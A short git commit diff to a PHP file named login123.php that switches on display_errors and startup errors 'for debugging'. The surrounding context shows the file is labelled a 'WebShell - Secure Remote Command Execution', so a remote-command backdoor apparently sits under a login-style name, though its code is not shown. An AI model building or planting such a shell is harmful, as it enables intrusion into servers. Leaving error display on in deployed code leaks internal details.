fb16414d07dff7e8220bc3d0560f45de13aaaf5c
nhat <lmn147852369@gmail.com>
2026-08-10 00:03:57 +0700

    fix: enable error reporting in login123.php for improved debugging during development

--- login123.php
+++ login123.php
@@ -2,7 +2,8 @@
 
 // --- Debug (tắt khi deploy production) ---
 error_reporting(E_ALL);
-ini_set('display_errors', 0);
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
 
 /**
  * WebShell - Secure Remote Command Execution
